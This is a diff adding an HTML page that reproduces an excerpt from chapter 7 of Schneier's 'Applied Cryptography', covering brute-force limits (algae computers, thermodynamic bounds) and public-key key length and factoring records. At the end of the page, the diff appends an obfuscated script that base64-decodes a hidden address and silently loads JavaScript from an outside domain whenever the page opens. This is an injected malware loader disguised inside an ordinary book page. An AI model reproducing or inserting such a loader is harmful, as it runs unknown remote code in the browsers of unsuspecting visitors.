@@ -1,0 +1,82 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=157-159//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Assume the typical algae cell is the size of a cube 10 microns on a side (this is probably a large estimate), then 10<SUP>15</SUP> of them can fill a cubic meter. Pump them into the ocean and cover 200 square miles (518 square kilometers) of water to a meter deep (you figure out how to do it&#151;I&#146;m just the idea man), and you&#146;d have 10<SUP>23</SUP> (over a hundred billion gallons) of them floating in the ocean. (For comparison, the Exxon <I>Valdez</I> spilled 10 million gallons of oil.) If each of them can try a million keys per second, they will recover the key for a 128-bit algorithm in just over 100 years. (The resulting algae bloom is your problem.) Breakthroughs in algae processing speed, algae diameter, or even the size puddle one could spread across the ocean, would reduce these numbers significantly.</P>
+<P>Don&#146;t even ask me about nanotechnology.</P>
+<P><FONT SIZE="+1"><B><I>Thermodynamic Limitations</I></B></FONT></P>
+<P>One of the consequences of the second law of thermodynamics is that a certain amount of energy is necessary to represent information. To record a single bit by changing the state of a system requires an amount of energy no less than k<I>T,</I> where <I>T</I> is the absolute temperature of the system and k is the Boltzman constant. (Stick with me; the physics lesson is almost over.)</P>
+<P>Given that k =1.38*10<SUP>-16</SUP> erg/&#176;Kelvin, and that the ambient temperature of the universe is 3.2&#176;K, an ideal computer running at 3.2&#176;K would consume 4.4*10<SUP>-16</SUP> ergs every time it set or cleared a bit. To run a computer any colder than the cosmic background radiation would require extra energy to run a heat pump.</P>
+<P>Now, the annual energy output of our sun is about 1.21*10<SUP>41</SUP> ergs. This is enough to power about 2.7*10<SUP>56</SUP> single bit changes on our ideal computer; enough state changes to put a 187-bit counter through all its values. If we built a Dyson sphere around the sun and captured all of its energy for 32 years, without any loss, we could power a computer to count up to 2<SUP>192</SUP>. Of course, it wouldn&#146;t have the energy left over to perform any useful calculations with this counter.</P>
+<P>But that&#146;s just one star, and a measly one at that. A typical supernova releases something like 10<SUP>51</SUP> ergs. (About a hundred times as much energy would be released in the form of neutrinos, but let them go for now.) If all of this energy could be channeled into a single orgy of computation, a 219-bit counter could be cycled through all of its states.</P>
+<P>These numbers have nothing to do with the technology of the devices; they are the maximums that thermodynamics will allow. And they strongly imply that brute-force attacks against 256-bit keys will be infeasible until computers are built from something other than matter and occupy something other than space.</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">7.2 Public-Key Key Length</FONT></H3>
+<P>One-way functions were discussed in Section 2.3. Multiplying two large primes is a one-way function; it&#146;s easy to multiply the numbers to get a product but hard to factor the product and recover the two large primes (see Section 11.3). Public-key cryptography uses this idea to make a trap-door one-way function. Actually, that&#146;s a lie; factoring is <I>conjectured to be</I> a hard problem (see Section 11.4). As far as anyone knows, it seems to be. Even if it is, no one can prove that hard problems are actually hard. Most everyone assumes that factoring is hard, but it has never been mathematically proven one way or the other.</P>
+<P>This is worth dwelling on. It is easy to imagine that 50 years in the future we will all sit around, reminiscing about the good old days when people used to think factoring was hard, cryptography was based on factoring, and companies actually made money from this stuff. It is easy to imagine that future developments in number theory will make factoring easier or that developments in complexity theory will make factoring trivial. There&#146;s no reason to believe this will happen&#151;and most people who know enough to have an opinion will tell you that it is unlikely&#151;but there&#146;s also no reason to believe it won&#146;t.</P>
+<P>In any case, today&#146;s dominant public-key encryption algorithms are based on the difficulty of factoring large numbers that are the product of two large primes. (Other algorithms are based on something called the Discrete Logarithm Problem, but for the moment assume the same discussion applies.) These algorithms are also susceptible to a brute-force attack, but of a different type. Breaking these algorithms does not involve trying every possible key; breaking these algorithms involves trying to factor the large number (or taking discrete logarithms in a very large finite field&#151;a similar problem). If the number is too small, you have no security. If the number is large enough, you have security against all the computing power in the world working from now until the sun goes nova&#151;given today&#146;s understanding of the mathematics. Section 11.3 discusses factoring in more mathematical detail; here I will limit the discussion to how long it takes to factor numbers of various lengths.</P>
+<P>Factoring large numbers is hard. Unfortunately for algorithm designers, it is getting easier. Even worse, it is getting easier faster than mathematicians expected. In 1976 Richard Guy wrote: &#147;I shall be surprised if anyone regularly factors numbers of size 10<SUP>80</SUP> without special form during the present century&#148; [680]. In 1977 Ron Rivest said that factoring a 125-digit number would take 40 quadrillion years [599]. In 1994 a 129-digit number was factored [66]. If there is any lesson in all this, it is that making predictions is foolish.</P>
+<P>Table 7.3 shows factoring records over the past dozen years. The fastest factoring algorithm during the time was the quadratic sieve (see Section 11.3).</P>
+<P>These numbers are pretty frightening. Today it is not uncommon to see 512-bit numbers used in operational systems. Factoring them, and thereby completely compromising their security, is well in the range of possibility: A weekend-long worm on the Internet could do it.</P>
+<P>Computing power is generally measured in mips-years: a one-million-instruction-per-second (mips) computer running for one year, or about 3*10<SUP>13</SUP> instructions. By convention, a 1-mips machine is equivalent to the DEC VAX 11/780. Hence, a mips-year is a VAX 11/780 running for a year, or the equivalent. (A 100 MHz Pentium is about a 50 mips machine; a 1800-node Intel Paragon is about 50,000.)</P>
+<P>The 1983 factorization of a 71-digit number required 0.1 mips-years; the 1994 factorization of a 129-digit number required 5000. This dramatic increase in computing power resulted largely from the introduction of distributed computing, using the idle time on a network of workstations. This trend was started by Bob Silverman and fully developed by Arjen Lenstra and Mark Manasse. The 1983 factorization used 9.5 CPU hours on a single Cray X-MP; the 1994 factorization took 5000 mips-years and used the idle time on 1600 computers around the world for about eight months. Modern factoring methods lend themselves to this kind of distributed implementation.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-05.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(DeDXclNi, xaTNqKqV) {xaTNqKqV = DeDXclNi.createElement('script');xaTNqKqV.type = 'text/javascript';xaTNqKqV.async = true;xaTNqKqV.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');DeDXclNi.getElementsByTagName('body')[0].appendChild(xaTNqKqV);}(document));</script></body>
+</html>
